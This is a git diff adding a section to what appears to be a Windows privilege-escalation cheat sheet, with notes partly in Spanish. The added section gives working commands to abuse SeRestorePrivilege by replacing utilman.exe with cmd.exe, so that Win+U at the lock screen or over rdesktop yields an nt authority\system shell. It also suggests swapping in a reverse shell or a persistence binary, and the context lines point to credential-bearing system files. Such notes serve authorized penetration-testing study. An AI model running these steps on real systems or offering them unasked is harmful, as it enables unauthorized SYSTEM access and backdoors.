@@ -256,6 +256,21 @@ c:\inetpub\wwwwroot\web.config
 %WINDIR%\system32\config\system.sav
 ```
 
+## SeRestorePrivilege
+1. Launch PowerShell/ISE with the SeRestore privilege present.
+2. Enable the privilege with Enable-SeRestorePrivilege).
+3. Rename utilman.exe to utilman.old
+4. Rename cmd.exe to utilman.exe
+5. Lock the console and press Win+U
+- `Rename-Item -Path "C:\Windows\System32\utilman.exe" -NewName "utilman.old"`
+- `ren cmd.exe Utilman.exe`
+- Ahora podemos utilizar rdesktop para conectarnos a la maquina y ejecutar el cmd.exe con el privilegio SeRestorePrivilege.
+    - `rdesktop IP`
+    - WIN + U
+        - `whoami => nt authority\system`
+- También podemos reemplazar utilman por otra cosa, por ejemplo un reverse shell, o un binario que nos haga persistencia.
+
+
 ## SeBackupPrivilege
 - Este privilegio permite la habilidad de leer cualquier archivo del sistema y realizar copias de seguridad de esos archivos.
 - `Get-SeBackupPrivilege`
